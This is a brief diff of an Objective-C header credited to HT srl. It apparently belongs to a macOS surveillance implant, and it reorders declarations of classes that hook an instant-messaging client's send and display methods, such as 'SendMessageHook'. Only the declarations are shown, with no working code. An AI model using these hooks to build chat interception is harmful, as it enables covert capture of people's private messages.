@@ -5,17 +5,9 @@
 //  Created by revenge on 4/15/11.
 //  Copyright 2011 HT srl. All rights reserved.
 //
+#import "RCSMInterface.h"
 
 #import "RCSMInputManager.h"
-
-
-@interface myIMWindowController : NSObject
-
-- (void)SendMessageHook: (unichar *)arg1
-                cchText: (NSUInteger)arg2
-                 inHTML: (NSString *)arg3;
-
-@end
 
 @interface myIMWebViewController : NSObject
 
@@ -27,5 +19,13 @@
                        fParseURLs: (unsigned char)arg6
                      inSenderName: (int)arg7
                        fLocalUser: (CFStringRef)arg8;
+
+@end
+
+@interface myIMWindowController : NSObject
+
+- (void)SendMessageHook: (unichar *)arg1
+                cchText: (NSUInteger)arg2
+                 inHTML: (NSString *)arg3;
 
 @end
